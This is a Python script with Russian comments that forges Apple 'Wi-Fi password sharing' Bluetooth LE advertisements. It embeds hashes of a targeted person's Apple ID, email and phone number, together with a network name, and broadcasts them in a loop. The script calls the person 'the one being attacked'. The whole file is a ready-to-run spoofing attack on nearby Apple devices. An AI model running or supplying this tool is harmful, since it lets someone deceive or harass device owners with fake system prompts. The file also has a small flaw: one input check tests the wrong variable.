#!/usr/bin/env python3

import hashlib, sys
from time import sleep
import bluetooth._bluetooth as bluez
from bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

def get_hash(data, size=3):
    return tuple(bytearray.fromhex(hashlib.sha256(data.encode('utf-8')).hexdigest())[:size])

print("Утилита для создания фейкового сообщения о Wi-Fi шеринге")
print("Должны быть установлены: pybluez, в директории должен быть файл bluetooth_utils")
print("Проверьте, что интерфейс hcitool dev - hci0")

dev_id = 0                                                  # Считаем, что bluetooth - hci0
toggle_device(dev_id, True)                                 # Устновка интерфейса bluetooth
header = (0x02, 0x01, 0x1a, 0x1a, 0xff, 0x4c, 0x00)         # Заголовок
const1 = (0x0f, 0x11, 0xc0, 0x08)                           # Постоянная часть пакета 
id1 = (0xff, 0xff, 0xff)                                    # Идентификатор отправителя

# Задаем почту appleid жертвы
appleid = input("Введите почту AppleId атакуемого: (пропустите, если не знаете, пример: oleg@oleg.com): ")
if ((len(appleid)==0)|(appleid==None)):
    appleid = get_hash("none")
else:
    appleid = get_hash(appleid)

# Задаем почту жертвы
mail = input("Введите почту атакуемого: (пропустите, если не знаете, пример: oleg@oleg.com): ")
if ((len(mail)==0)|(mail==None)):
    mail = get_hash("none")
else:
    mail = get_hash(mail)

# Задаем телефон жертвы
tel = input("Введите телефон атакуемого: (пропустите, если не знаете, пример: 79637760000): ")
if ((len(tel)==0)|(mail==None)):
    tel = get_hash("none")
else:
    tel = get_hash(tel)

id_wifi = get_hash(input("Введите имя точки доступа: "))    # Устанавливаем SSID-сети
const2 = (0x10, 0x02, 0x0b, 0x0c,)                          # Трейлинг

print("Начинаю атаку...")    
try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Интерфейс hci0 недоступен!")
    sys.exit()
try:
    start_le_advertising(sock, adv_type=0x00, min_interval=200, max_interval=200, data=(
                header + const1 + id1 + appleid + tel + mail + id_wifi + const2))
    while True:
        sleep(2)
except:
    stop_le_advertising(sock)
    sys.exit()